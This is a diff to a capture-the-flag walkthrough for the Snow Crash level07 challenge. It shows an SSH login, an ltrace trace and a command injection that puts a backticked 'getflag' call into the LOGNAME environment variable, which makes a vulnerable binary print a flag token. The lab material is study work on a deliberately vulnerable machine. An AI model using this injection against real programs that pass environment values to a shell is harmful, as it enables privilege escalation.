@@ -1,3 +1,13 @@
+TLTR;
+┌──$ [~/42/2021/snow-crash]
+└─>  ssh 192.168.1.64 -p 4242 -l level07
+level07@192.168.1.64's password: wiok45aaoguiboiki2tuin6ub
+level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+
+
 ┌──$ [~/42/2021/snow-crash]
 └─>  ssh 192.168.1.64 -p 4242 -l level07
 level07@192.168.1.64's password: wiok45aaoguiboiki2tuin6ub
@@ -14,7 +24,6 @@ system("/bin/echo level07 "level07
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                                                                                             = 0
 +++ exited (status 0) +++
-level07@SnowCrash:~$ export LOGNAME="; getflag"
+level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
 level07@SnowCrash:~$ ./level07
-
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
